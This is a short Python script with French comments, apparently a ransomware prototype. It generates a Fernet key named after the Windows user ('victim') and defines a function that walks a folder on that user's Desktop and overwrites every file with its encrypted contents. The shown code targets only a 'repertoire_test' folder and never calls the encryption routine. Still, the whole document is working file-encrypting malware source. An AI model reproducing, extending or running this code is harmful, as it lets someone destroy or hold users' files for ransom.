#!/usr/bin/env python
#coding:utf-8

import cryptography
import subprocess, sys, os
import subprocess as sub
from cryptography.fernet import Fernet
from pathlib import Path, PurePath, PureWindowsPath
from os import walk

victim = os.environ["USERNAME"]
drive = os.environ["SystemDrive"]
victimKey = "%s.key" %(victim)

def write_key():

    #générer le clé de chiffrement

    key = Fernet.generate_key()
    with open(victimKey, "wb") as key_file:
        key_file.write(key)
write_key()

def load_key():

    #télécharger et stocker la clé dans un fichier `user.key`

    return open(victimKey, "rb").read()
key = load_key()


def encrypt(filename, key):

    #Given a filename (str) and key (bytes), it encrypts the file and write it

    f = Fernet(key)
    with open(filename, "rb") as file:
        # read all file data
        file_data = file.read()
    # encrypt data
    encrypted_data = f.encrypt(file_data)
    # write the encrypted file
    with open(filename, "wb") as file:
        file.write(encrypted_data)

def repertoire():   #chiffrement de tout types de fichiers quelque soit son extension
    repertoire = ["%s\\Users\\%s\\Desktop\\repertoire_test\\"%(drive, victim)]
    for element in repertoire:
        for (root,dirs,files) in os.walk(element):
            for file in files :
                for extension in file.split("."):
                    if file.endswith(extension):
                        full = os.path.join(root, file)
                        encrypt(full, key)
